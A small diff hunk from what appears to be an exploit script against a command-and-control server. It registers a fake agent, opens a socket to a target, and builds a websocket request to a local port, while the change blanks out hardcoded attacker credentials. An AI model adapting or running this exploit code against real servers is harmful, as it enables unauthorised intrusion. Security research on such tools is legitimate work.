@@ -240,8 +240,8 @@ register_agent(hostname, username, domain_name, internal_ip, process_name, proce
 socket_id = b"\x11\x11\x11\x11"
 open_socket(socket_id, args.ip, int(args.port))
 
-USER = "ilya"
-PASSWORD = "CobaltStr1keSuckz!"
+USER = ""
+PASSWORD = ""
 host = "127.0.0.1"
 port = 40056
 websocket_request = create_websocket_request(host, port)
